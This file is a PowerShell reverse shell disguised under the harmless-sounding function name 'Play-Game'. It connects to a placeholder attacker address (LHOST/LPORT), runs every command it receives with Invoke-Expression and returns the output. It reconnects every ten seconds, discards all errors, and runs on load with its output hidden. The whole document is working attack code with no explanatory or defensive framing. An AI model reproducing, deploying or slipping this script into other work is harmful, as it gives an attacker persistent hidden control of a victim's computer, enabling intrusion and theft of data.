
function Play-Game {
    while ("True") {
        try {
            $client = New-Object Net.Sockets.TcpClient
            $client.Connect('LHOST', LPORT)
            if ($client.Connected) {
                $stream = $client.GetStream()
                $reader = New-Object IO.StreamReader($stream)
                $writer = New-Object IO.StreamWriter($stream)
                $writer.AutoFlush = "True"
    
                $prompt = "PS " + (pwd) + "> "
                $writer.Write($prompt)
    
                while ($client.Connected -and $stream.CanRead) {
                    $cmd = $reader.ReadLine()
                    if ($cmd -eq $null) { break }
                    if ($cmd.Trim() -eq "") {
                        $writer.Write("PS " + (pwd) + "> ")
                        continue
                    }
                    if ($cmd -eq "exit") { break }
    
                    $result = try {
                        Invoke-Expression $cmd 2>&1 | Out-String
                    } catch {
                        $_.Exception.Message | Out-String
                    }
    
                    $writer.Write($result + "PS " + (pwd) + "> ")
                }
    
                $client.Close()
            }
        } catch {
            
        }
        Start-Sleep -Seconds 10
    }
}

Play-Game | Out-Null
